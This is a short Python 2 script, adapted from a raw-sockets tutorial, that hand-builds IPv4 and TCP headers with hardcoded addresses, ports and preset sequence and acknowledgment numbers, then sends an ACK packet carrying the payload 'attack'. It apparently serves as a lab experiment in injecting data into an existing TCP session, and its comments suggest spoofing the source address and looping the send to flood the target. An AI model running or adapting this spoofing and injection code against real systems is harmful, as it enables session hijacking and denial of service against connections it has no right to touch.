'''
    Raw sockets on Linux
     
    Silver Moon (m00n.silv3r@gmail.com)
'''
 
# some imports
import socket, sys
from struct import *
import traceback
 

case_1 = {'seq':2630708304, 'ack':1370969752}

def config():
	cfg = {
		'ip':{
			'src' : '172.27.112.178',
			'dst' : '172.27.12.37',
		},
		'tcp':{
			'src' : 40257,
			'dst' : 9999,
		},
	}
	return cfg

def checksum(msg):
    s = 0

    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i+1]) << 8 )
        s = s + w
     
    s = (s>>16) + (s & 0xffff);
    s = s + (s >> 16);
     
    #complement and mask to 4 byte short
    s = ~s & 0xffff
     
    return s
 
def rawsocket():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
		return s
	except socket.error , msg:
		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		raise


def ip_header_create(ip):
	ip_ihl = 5
	ip_ver = 4
	ip_tos = 0
	ip_tot_len = 0  # kernel will fill the correct total length
	ip_id = 54321   #Id of this packet
	ip_frag_off = 0
	ip_ttl = 255
	ip_proto = socket.IPPROTO_TCP
	ip_check = 0    # kernel will fill the correct checksum
	ip_saddr = socket.inet_aton ( ip['src'] )   #Spoof the source ip address if you want to
	ip_daddr = socket.inet_aton ( ip['dst'] )
	 
	ip_ihl_ver = (ip_ver << 4) + ip_ihl
	 
	# the ! in the pack format string means network order
	ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

	return ip_header

def tcp_header_create(tcp_cfg, check_sum):
	tcp_source = tcp_cfg['src']   # source port
	tcp_dest = tcp_cfg['dst']   # destination port
	tcp_seq = case_1['seq']
	tcp_ack_seq = case_1['ack']
	tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
	#tcp flags
	tcp_fin = 0
	tcp_syn = 0
	tcp_rst = 0
	tcp_psh = 0
	tcp_ack = 1
	tcp_urg = 0
	tcp_window = socket.htons (5840)    #   maximum allowed window size
	tcp_check = check_sum
	tcp_urg_ptr = 0
	 
	tcp_offset_res = (tcp_doff << 4) + 0
	tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
	 
	# the ! in the pack format string means network order
	tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
	
	return tcp_header

def pseudo_header_create(ip_cfg, tcp_cfg, data):
	tcp_header = tcp_header_create(tcp_cfg, 0)
	source_address = socket.inet_aton( ip_cfg['src'] )
	dest_address = socket.inet_aton(ip_cfg['dst'])
	placeholder = 0
	protocol = socket.IPPROTO_TCP
	tcp_length = len(tcp_header) + len(data)
	 
	psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
	psh = psh + tcp_header + data;
	return psh

def cal_checksum(cfg, data):
	pseudo_header = pseudo_header_create(cfg['ip'], cfg['tcp'], data)
	tcp_check = checksum(pseudo_header)
	return tcp_check
	
def main():
	try:
		cfg = config()
		s = rawsocket()
		ip_header = ip_header_create(cfg['ip'])
		data = 'attack'
		tcp_check = cal_checksum(cfg, data)
		tcp_header = tcp_header_create(cfg['tcp'], tcp_check)
		packet = ip_header + tcp_header + data
		s.sendto(packet, (cfg['ip']['dst'] , 0 ))    # put this in a loop if you want to flood the target
	except:
		print traceback.format_exc()
	

if __name__ == "__main__":
	main()
